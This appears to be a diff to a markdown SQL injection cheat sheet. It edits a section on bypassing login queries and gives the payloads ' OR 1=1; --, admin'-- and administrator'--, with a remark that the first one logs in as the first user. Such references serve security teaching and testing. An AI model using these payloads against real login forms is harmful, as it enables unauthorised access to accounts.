@@ -60,9 +60,11 @@ This attack allowed the user to drop the table when it should be allowed.
 
 ### [Logins](#table-of-contents)
 Bypassing logins
-- `SELECT id FROM users WHERE password = '' AND username = ''` or `SELECT id FROM users WHERE username = '' AND password = ''`
+- `SELECT * FROM users WHERE password = '' AND username = ''` or `SELECT * FROM users WHERE username = '' AND password = ''`
 	- Whichever is first, username input or password input: `' OR 1=1; --`
+	- Would login to the first user
 
+- When username is first
 `admin'--`
 `administrator'--`
 
